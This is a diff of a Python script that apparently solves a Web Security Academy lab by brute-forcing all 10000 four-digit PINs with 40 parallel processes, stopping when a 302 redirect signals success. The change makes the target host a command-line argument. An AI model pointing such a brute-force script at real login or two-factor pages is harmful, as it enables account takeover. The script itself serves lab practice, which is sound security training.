@@ -8,14 +8,9 @@ from bs4 import BeautifulSoup
 import multiprocessing
 import traceback
 
-
-"""
 site = sys.argv[1]
 if 'https://' in site:
     site = site.rstrip('/').lstrip('https://')
-"""
-# For me only
-site = 'ac671f851f15b44e8031427e00b50093.web-security-academy.net'
 
 
 def try_code(csrf, code, s):
@@ -76,7 +71,10 @@ if __name__ == '__main__':
     s = requests.Session()
     p = multiprocessing.Pool(40)
     processing = [x for x in range(10000)]
-    results = p.map(dispatch_requests, [[x, s] for x in processing])
+    results = p.imap(dispatch_requests, [[x, s] for x in processing])
+    for x in results:
+        if x == 302:
+            exit()
     p.close()
     if 302 not in results:
         print("Sorry, PIN not found.")
